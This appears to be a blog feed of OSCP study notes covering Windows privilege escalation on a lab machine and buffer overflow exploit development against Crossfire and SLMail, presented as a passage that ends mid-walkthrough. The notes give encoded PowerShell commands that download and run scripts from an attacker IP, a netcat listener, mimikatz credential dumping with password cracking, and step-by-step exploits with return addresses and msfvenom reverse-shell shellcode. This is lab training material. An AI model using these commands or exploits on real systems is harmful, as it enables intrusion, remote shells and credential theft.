+IconLocation : C:\ZKTeco\ZKAccess3.5\img\AccessNET.
+ico,0
+RelativePath :
+TargetPath : C:\Windows\System32\runas.exe
+WindowStyle : 1
+WorkingDirectory : C:\ZKTeco\ZKAccess3.5
+runas /user:ACCESS\Administrator /savecred whoami
+This string 'http://10.10.14.3:8000/9002.ps1'
+To this encoding prior to base64
+--to-code UTF-16LE
+Full command in kali
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/9002.ps1')" | iconv --to-code UTF-16LE |
+47/67
+base64 -w 0
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB
+Set up listener on KALI
+nc -nlvp 9002
+runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB
+Use mimikatz
+Need write access to download, go to your users desktop
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.7:8000/mimikatz.exe', 'mimkatz.exe')
+didnt work
+tried from telnet sessiondir
+powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.7:8000/mimikatz.exe', 'mimkatz.exe')
+not recog as command
+github Generic-AppLockerbypasses.md
+Empire Chatterbox
+Look at original nmap scan for other shite running (nmap localhost)
+check permissions on webserver echo PleaseSubscribe &amp;gt; test
+FAILS
+Directory: C:\inetpub\wwwroot
+Mode LastWriteTime Length Name&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;d---- 8/21/2018 11:30 PM aspnet_cli
+ent
+-a--- 8/24/2018 12:33 AM 391 index.html
+-a--- 8/24/2018 8:39 PM 88712 out.jpg
+PASSWORDS cmdkey /list - is a stored pw
+Currently stored credentials:
+Target: Domain:interactive=ACCESS\Administrator
+Type: Domain Password
+User: ACCESS\Administrator
+→ Use Mimikatz
+48/67
+KERNEL EXPLOITS If no service packs or Hotfixes then possibly vulnerable to kernel exploits
+pgdump.exe, pwdump.exe, fgdump.exe
+type 127.0.0.1 pwdump
+wce32.exe -w
+wce64.exe -w
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords # gets passwords
+Hashed passwords
+https://crackstation.net
+https://hashkiller.co.uk
+john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Fri, 01 Nov 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-11-01:/oscp-windows-privilege-escalation.html</guid><category>misc</category></item><item><title>"OSCP: Linux Buffer Overflow"</title><link>/oscp-linux-buffer-overflow.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;OSCP&lt;/li&gt;
+&lt;li&gt;Linux&lt;/li&gt;
+&lt;li&gt;Buffer Overflow&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
+&lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
+&lt;h3&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h3&gt;
+&lt;p&gt;iptables –A, -p, -d, -j # Append, protocol, destination, jump
+crossfire listens on port 13327
+iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
+iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP&lt;/p&gt;
+&lt;h3&gt;1. Run debugger and crash the app&lt;/h3&gt;
+&lt;p&gt;Get POC code from exploit db
+edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
+crash = “\x41” &lt;em&gt;4379
+buffer = “\x11(setup sound “ + crash + “\x90\x00#”
+python fuzz.py
+2. Control EIP
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
+Swap into the crash var: python linux_buffer_overflow.py 
+EIP has been overwritten with the hex characters… 46 36 70 46
+These are unique 4 bytes in the buffer. Now find where they are in the buffer.
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
+[&lt;/em&gt;] Exact match at offset 4368
+Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Make space for the shellcode&lt;br&gt;
+Check for helpful registers: Follow in dump.
+EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
+ESP points to end of buffer “C * 7” (spare bytes). 
+Add 12 bytes to EAX to align EAX with the A’s =&amp;gt; JMP EAX we skip over “setup sound “
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm &amp;gt; add eax,12   83C00C add eax,byte +0xc
+nasm &amp;gt; jmp eax      FFE0 jmp eax
+Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Discover bad characters
+All bad chars (except x00) contained in deault named script. Can use this for future.
+python bad_chars.py
+ID/remove bad chars in buffer. Right-click EAX. Follow in stack &amp;amp; dump. Stack looked better in EDBG. Scroll down dump until end of A’s. Then should see 01, 02, 03… etc until a failure. remove failure from bad_chars.py. Redo until ESP-error-free crash 
+Removed: (\x00\x0a\x0d\x20)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Redirect execution flow - Find a return address
+So, we know we want to reach the buffer pointed to by the ESP register.
+EDBG: Plugins: Opcode Seacher: 
+Once the application is in a crashed state use dropdown to search for:
+ESP -&amp;gt; EIP: 
+Choose 1st JMP ESP. Add address to python script at BBBB.
+crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90“
+EDBG: Add breakpoint at 0x08134597 to execution flow. 
+Right-click Go to Address 0x08134597. Double click on it to place breakpoint.
+Restart EDBG. Send payload. Should pause at First stage payload.
+Next instruction is JMP ESP. F8. We are redirected to ESP 83C00C 
+As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A’s&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;Make shellcode excluding bad characters
+bind or reverse? why?
+msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c –b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
+Resulting shell code is 105 bytes&lt;/li&gt;
+&lt;li&gt;Add shellcode into python script
+shellcode = ("\xd9... \x30")
+ret="\x97\x45\x13\x08”
+crash=shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90“
+buffer = "\x11(setup sound " + crash + "\x90\x00#“
+TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
+python exploit.py
+id; whoami&lt;/li&gt;
+&lt;/ol&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel</dc:creator><pubDate>Thu, 31 Oct 2019 00:00:00 -0500</pubDate><guid isPermaLink="false">tag:None,2019-10-31:/oscp-linux-buffer-overflow.html</guid><category>misc</category></item><item><title>"OSCP: Windows Buffer Overflow"</title><link>/oscp-windows-buffer-overflow.html</link><description>&lt;ul&gt;
+&lt;li&gt;Cyber Security
+tags:&lt;/li&gt;
+&lt;li&gt;OSCP&lt;/li&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;li&gt;Buffer Overflow&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
+&lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are available on Exploit Database (&lt;a href="https://www.exploit-db.com/exploits/638"&gt;exploit&lt;/a&gt;)!&lt;/p&gt;
+&lt;p&gt;You will have to jump between your Kali machine (to tweak your exploit) and the Windows VM (to restart SLMail after each crash and analyze the crash in Immunity Debugger) You will need &lt;a href="https://www.immunityinc.com/products/debugger/"&gt;Immunity Debugger&lt;/a&gt; to help develop your exploit.&lt;/p&gt;
+&lt;h3&gt;1. Run Immunity Debugger, attach SLMail, run the buffer overflow and crash SLMail&lt;/h3&gt;
+&lt;p&gt;We can start with the simple proof of concept above that we will modify bit-by-bit until we get a fully functional exploit that gives a reverse shell to our Kali machine.
+First, on your target Windows VM: run SLMail (as admin).
+Open Immunity Debugger and attach SLMail to it; Make sure that Immunity debugger is running then go to your KALI machine and run the proof-of-concept (poc.py) Python2 script shown below.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+
+&lt;span class="c1"&gt;# opens a socket&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# we are sending a string of 2700 &amp;#39;A&amp;#39;s&lt;/span&gt;
+&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2700&lt;/span&gt;
+
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+ &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;Sending buffer&amp;quot;&lt;/span&gt;
+
+ &lt;span class="c1"&gt;# connect to the target ip and port 110&lt;/span&gt;
+ &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.1.1.150&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;110&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+ &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+ &lt;span class="c1"&gt;# send a generic username&lt;/span&gt;
+ &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;USER username&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+ &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+ &lt;span class="c1"&gt;# send the buffer&lt;/span&gt;
+ &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PASS &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+ &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;Done!.&amp;quot;&lt;/span&gt;
+
+&lt;span class="c1"&gt;# return the following message if we failed to connect&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+ &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Could not connect to POP3!&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Run from KALI&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python poc.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The SLMail app should crash and the EIP register in Immunity should be filled with &lt;strong&gt;41&lt;/strong&gt;s... the hex equivalent of the ASCII character &lt;strong&gt;A&lt;/strong&gt; see figure below (1).&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/oscp/win_buff_0.jpg" title="step 1"&gt;&lt;/p&gt;
+&lt;h3&gt;2. Control EIP&lt;/h3&gt;
+&lt;p&gt;Next we need to locate the exact bytes at which the Extended Instruction Pointer (EIP) is overwritten. The EIP tells the computer where in memory to execute the next command. If we can find where the EIP is we can exchange those bytes at the EIP with a memory address containing our reverse shellcode. So, instead of sending a string of 2700 &lt;strong&gt;A&lt;/strong&gt;s, we send a specially crafted string of 2700 characters. Each sequence of 4 letters in this string is unique. We can simply determine how far along the 2700 charcaters the unique 4 letter overwrite the EIP. 
+2a. We use a Metasploit script to generate the unique string as follows:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We swap out the buffer in the python script. Prior to resending the exploit we have to restart SLMail on the target and reattach to Immunity debugger. This will be the case after each exploit attempt. Now we resend with the following buffer...&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Aa0Aa1Aa2Aa3Aa4A... &amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We see from  the figure 2a the EIP is overwritten by &lt;code&gt;39694438&lt;/code&gt;. We use a similar Metasploit script to find the offset of these characters in the buffer string.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q &lt;span class="m"&gt;39694438&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exact match at offset &lt;span class="m"&gt;2606&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;To check if this offset of 2606 is true we can remove the unique string buffer and send the following string.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;90&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As the EIP register offset is 2606 the next 4 characters &lt;strong&gt;BBBB&lt;/strong&gt; (&lt;strong&gt;42424242&lt;/strong&gt;) should now be at the EIP when we rerun the poc.py (see figure below, 2b). If everything has gone well, this is the case.&lt;/p&gt;
+&lt;h3&gt;3. Make space for the shellcode (ESP)&lt;/h3&gt;
+&lt;p&gt;With our current exploit the ESP points to the beginning of the string of 90 * &lt;strong&gt;C&lt;/strong&gt;. The problem is that 90 bytes – not enough for full shellcode which will be ~350 bytes.
+Can we extend buffer to 3500 to make room for shellcode? If the ESP is located at 2606 + 4. Can we add some more buffer after this to make space for the shellcode. So we retry the earlier exploit but with a longer buffer of &lt;strong&gt;C&lt;/strong&gt;s. See below:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3500&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt; &lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The result is in the figure below (3).&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/oscp/win_buff_1.JPG" title="step 2a, 2b, 3"&gt;&lt;/p&gt;
+&lt;p&gt;As we can see, our buffer overflow still crashes the app. We now have some space to insert our shellcode...&lt;/p&gt;
+&lt;h3&gt;4. Discover bad characters (\0x00, \0x0D, \0x0A, etc)&lt;/h3&gt;
+&lt;p&gt;We do need to ensure that no &lt;strong&gt;bad characters&lt;/strong&gt; get sent in the buffer. We know that &lt;strong&gt;A&lt;/strong&gt;s, &lt;strong&gt;B&lt;/strong&gt;,s and &lt;strong&gt;C&lt;/strong&gt;s dont seem to be an issue thus far. But what about characters like &lt;strong&gt;00&lt;/strong&gt; that represent carriage return! We need to find all possible bad characters and ensure that our shellcode is composed without them. We can achieve this by sending a full list of all possible characters in the buffer starting from the ESP (where our shellcode will start). Immunity debugger has the ability to identify the bad characters if we simply examine the hex dump from the ESP onwards! &lt;/p&gt;
+&lt;p&gt;We replace the long &lt;strong&gt;C&lt;/strong&gt; string with this complete hex character list.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;bad&lt;/span&gt; &lt;span class="n"&gt;chars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="se"&gt;\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="se"&gt;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="se"&gt;\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="se"&gt;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="se"&gt;\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="se"&gt;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;badchars&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can identify truncations in buffer (figure beow (4). We identify the bad character &lt;strong&gt;\x0a&lt;/strong&gt; (line feed). Remove it from the bad charcters list in the exploit. Then, rerun the exploit. We repeat this process until the app crashes with no more truncations in the hex dump. Eventually, we find the only bad characters are (&lt;strong&gt;\0x00&lt;/strong&gt;, &lt;strong&gt;\0x0D&lt;/strong&gt;, &lt;strong&gt;\0x0A&lt;/strong&gt;). Our shellcode must be composed without these characters.&lt;/p&gt;
+&lt;h3&gt;5. Redirect execution flow - Find a return address&lt;/h3&gt;
+&lt;p&gt;The ESP address changes each crash. We need a reliable/accessible JMP ESP in memory. That way we can jump to it and excecute the shellcode.
+Immunity debugger can execute certain modules to help find JMP ESPs in memory as SLMail runs. We must choose a module with following criteria: 
+1. No memory protection such as DEP and ASLR. 
+2. No bad characters in memory range.&lt;/p&gt;
+&lt;p&gt;With SLMail running. Into the Immunity debugger command line enter:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="sx"&gt;!mona modules&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;!mona&lt;/strong&gt; module identified the SLMFC.DLL as not being affected by any memory protection schemes and not being rebased on each reboot. Therefore, the DLL will always load to same address. Use mona again to find a JMP ESP (or equivalent opcode) instruction within this DLL, and identify its memory address.&lt;br&gt;
+In Immunity Debugger:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;Use Metasploit NASM Shell ruby script to find the opcode for jmp esp.&lt;/span&gt;
+&lt;span class="err"&gt;```bash&lt;/span&gt;
+&lt;span class="err"&gt;/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb &lt;/span&gt;
+&lt;span class="err"&gt;nasm &amp;gt; jmp esp &lt;/span&gt;
+&lt;span class="err"&gt;FFE4&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Now search addresses for FFE4. Remember the memory address needs to be free of bad characters. 
+Back in Immunity Debugger command line.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="sx"&gt;!mona find –s “\xff\xe4” –m slmfc.dll&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The address &lt;strong&gt;0x5f4a358f&lt;/strong&gt; looks good (no bad characters).
+Replace the EIP (was &lt;strong&gt;BBBB&lt;/strong&gt; previously) in the buffer string of the exploit. We must note that an x86 address-reverse little Endian and so the characters are entered in reverse.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2606&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x8f\x35\x4a\x5f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;390&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If we rerun the exploit the EIP will be hit. It will point to the JMP ESP address where the buffer of &lt;strong&gt;C&lt;/strong&gt;s (or future shellcode) will run ()see figure below (5)!&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/assets/images/oscp/win_buff_2.JPG" title="step 4 &amp;amp; 5"&gt;&lt;/p&gt;
+&lt;h3&gt;6. Make shellcode excluding bad chars and insert to python script&lt;/h3&gt;
+&lt;p&gt;We can create the shellcode with Metasploit tool &lt;strong&gt;msfvenom&lt;/strong&gt;. This takes the arguments for you listening IP address (of your Kali machine, and the port you will be listening on - using netcat). The other argument of interest here is to exclude the bad characters we found earlier.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.11.0.160 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;443&lt;/span&gt; -f c –e x86/shikata_ga_nai -b &lt;span class="s2"&gt;&amp;quot;\x00\x0a\x0d&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The resulting shellcode is 351 bytes long and will be assigned to the variable &lt;strong&gt;shellcode&lt;/strong&gt; in the Python exploit.&lt;/p&gt;
+&lt;h3&gt;7. Add shellcode to python script with nop sled. Get a shell&lt;/h3&gt;
